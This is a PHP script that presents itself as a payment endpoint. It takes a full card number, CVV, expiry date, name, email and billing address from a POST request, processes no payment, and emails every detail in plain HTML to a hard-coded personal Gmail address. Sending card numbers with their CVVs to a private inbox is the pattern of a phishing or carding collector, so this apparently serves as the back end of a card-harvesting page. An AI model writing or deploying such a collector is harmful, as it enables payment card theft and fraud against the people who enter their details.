<?php
// Ensure the script only processes POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405); // Method Not Allowed
    echo json_encode(["error" => "Invalid request method"]);
    exit;
}

// Get the raw POST data
$requestBody = file_get_contents('php://input');
$data = json_decode($requestBody, true);

// Validate JSON decoding
if (json_last_error() !== JSON_ERROR_NONE) {
    http_response_code(400); // Bad Request
    echo json_encode(["error" => "Invalid JSON data"]);
    exit;
}

// Extract data with validation
$requiredFields = ['expYear', 'email', 'name', 'amount', 'cvv', 'cardNumber', 'expMonth', 'sendcard', 'zipCode', 'state', 'city', 'address'];
foreach ($requiredFields as $field) {
    if (empty($data[$field])) {
        http_response_code(400); // Bad Request
        echo json_encode(["error" => "Missing field: $field"]);
        exit;
    }
}

// Sanitize data
$expYear = htmlspecialchars($data['expYear'], ENT_QUOTES, 'UTF-8');
$email = filter_var($data['email'], FILTER_SANITIZE_EMAIL);
$name = htmlspecialchars($data['name'], ENT_QUOTES, 'UTF-8');
$amount = htmlspecialchars($data['amount'], ENT_QUOTES, 'UTF-8');
$cvv = htmlspecialchars($data['cvv'], ENT_QUOTES, 'UTF-8');
$cardNumber = htmlspecialchars($data['cardNumber'], ENT_QUOTES, 'UTF-8');
$expMonth = htmlspecialchars($data['expMonth'], ENT_QUOTES, 'UTF-8');
$zipCode = htmlspecialchars($data['zipCode'], ENT_QUOTES, 'UTF-8');
$state = htmlspecialchars($data['state'], ENT_QUOTES, 'UTF-8');
$city = htmlspecialchars($data['city'], ENT_QUOTES, 'UTF-8');
$address = htmlspecialchars($data['address'], ENT_QUOTES, 'UTF-8');

// Prepare email details
$to = "habeebajani9@gmail.com"; // Replace with your email address
$subject = "Payment Information Submitted";
$message = "
    <h1>Payment Details</h1>
    <p><strong>Name:</strong> $name</p>
    <p><strong>Email:</strong> $email</p>
    <p><strong>Amount:</strong> $amount</p>
    <p><strong>Card Number:</strong> $cardNumber</p>
    <p><strong>CVV:</strong> $cvv</p>
    <p><strong>Expiration Date:</strong> $expMonth/$expYear</p>
    <p><strong>Address:</strong> $address</p>
    <p><strong>City:</strong> $city</p>
    <p><strong>State:</strong> $state</p>
    <p><strong>ZIP Code:</strong> $zipCode</p>
";
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: noreply@example.com" . "\r\n"; // Replace with your domain email

// Send email and respond to the client
if (mail($to, $subject, $message, $headers)) {
    http_response_code(200); // OK
    echo json_encode(["success" => "Email sent successfully"]);
} else {
    http_response_code(500); // Internal Server Error
    echo json_encode(["error" => "Failed to send email"]);
}

exit;
?>
